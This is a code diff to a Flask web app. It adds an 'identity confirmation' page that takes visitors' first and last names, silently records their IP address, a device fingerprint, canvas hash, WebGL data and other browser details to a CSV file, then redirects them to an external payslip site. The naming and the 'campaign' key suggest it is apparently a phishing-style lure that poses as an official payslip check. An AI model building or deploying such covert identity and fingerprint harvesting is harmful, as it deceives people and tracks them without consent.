@@ -19,6 +19,11 @@ STATS_ACCESS_KEY = "pnp-pms-campaign2025"
 def index():
     return render_template('index.html')
 
+# Route for rendering the identity confirmation page
+@app.route('/identity')
+def identity():
+    return render_template('identity.html')
+
 """
 A function designed to retrieve 
 and return the client's actual IP address.
@@ -65,6 +70,142 @@ def get_client_ip():
             return client_ip
     
     return request.remote_addr
+
+# Handle identity form submission
+@app.route('/identity-submit', methods=['POST'])
+def identity_submit():
+    firstname = request.form.get('firstname')
+    lastname = request.form.get('lastname')
+    
+    # Get enhanced client information
+    ip_address = get_client_ip()
+    device_type = get_device_type()
+    device_fingerprint = generate_device_fingerprint()
+    browser_info = get_browser_info()
+    
+    if not firstname or not lastname:
+        return render_template('identity.html', error="Please enter both First Name and Last Name")
+    
+    # Save the data
+    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
+    save_identity_data(firstname, lastname, timestamp, ip_address, device_fingerprint, device_type, browser_info)
+    
+    # Redirect to specified external site
+    return redirect("https://payslip-pnppms.onrender.com/")
+
+def save_identity_data(firstname, lastname, timestamp, ip_address, device_fingerprint, device_type, browser_info):
+    """ 
+    Save identity data to CSV
+    """
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    csv_path = os.path.join(script_dir, 'data.csv')
+    
+    # Parse browser info from JSON string to dict
+    try:
+        browser_details = json.loads(browser_info)
+    except:
+        browser_details = {"full_user_agent": browser_info}
+    
+    try:
+        file_exists = os.path.isfile(csv_path)
+        
+        with open(csv_path, 'a', newline='\n') as csvfile:
+            writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)
+
+            """
+            if file does not exist or is empty, it will write header
+            """
+            if not file_exists or os.stat(csv_path).st_size == 0:
+                writer.writerow([
+                    'first_name',
+                    'last_name', 
+                    'timestamp', 
+                    'ip_address', 
+                    'device_fingerprint', 
+                    'device_type', 
+                    'browser_name', 
+                    'browser_version', 
+                    'os_name', 
+                    'os_version', 
+                    'language',
+                    'screen_resolution',
+                    'timezone',
+                    'canvas_hash',
+                    'webgl_info',
+                    'full_user_agent'
+                ])
+                csvfile.flush()
+
+            # append identity data with detailed browser info
+            writer.writerow([
+                firstname,
+                lastname, 
+                timestamp, 
+                ip_address, 
+                device_fingerprint, 
+                device_type, 
+                browser_details.get('browser_name', 'Unknown'),
+                browser_details.get('browser_version', 'Unknown'),
+                browser_details.get('os_name', 'Unknown'),
+                browser_details.get('os_version', 'Unknown'),
+                browser_details.get('language', 'Unknown'),
+                browser_details.get('screen_resolution', 'Unknown'),
+                browser_details.get('timezone', 'Unknown'),
+                browser_details.get('canvas_hash', 'Unknown'),
+                browser_details.get('webgl_info', 'Unknown'),
+                browser_details.get('full_user_agent', 'Unknown')
+            ])
+            csvfile.flush()
+    except PermissionError:
+        
+        """
+        if writing to default location fails, it will go alternative way/append
+        to navigate it's location request.
+        """
+        fallback_path = os.path.join(os.path.expanduser('~'), 'data.csv')
+        with open(fallback_path, 'a', newline='\n') as csvfile:
+            writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)
+            
+            if not os.path.exists(fallback_path) or os.stat(fallback_path).st_size == 0:
+                writer.writerow([
+                    'first_name',
+                    'last_name', 
+                    'timestamp', 
+                    'ip_address', 
+                    'device_fingerprint', 
+                    'device_type', 
+                    'browser_name', 
+                    'browser_version', 
+                    'os_name', 
+                    'os_version', 
+                    'language',
+                    'screen_resolution',
+                    'timezone',
+                    'canvas_hash',
+                    'webgl_info',
+                    'full_user_agent'
+                ])
+                csvfile.flush()
+            
+            writer.writerow([
+                firstname,
+                lastname, 
+                timestamp, 
+                ip_address, 
+                device_fingerprint, 
+                device_type, 
+                browser_details.get('browser_name', 'Unknown'),
+                browser_details.get('browser_version', 'Unknown'),
+                browser_details.get('os_name', 'Unknown'),
+                browser_details.get('os_version', 'Unknown'),
+                browser_details.get('language', 'Unknown'),
+                browser_details.get('screen_resolution', 'Unknown'),
+                browser_details.get('timezone', 'Unknown'),
+                browser_details.get('canvas_hash', 'Unknown'),
+                browser_details.get('webgl_info', 'Unknown'),
+                browser_details.get('full_user_agent', 'Unknown')
+            ])
+            csvfile.flush()
 
 """
 Function to determine if the client is using a mobile or desktop device
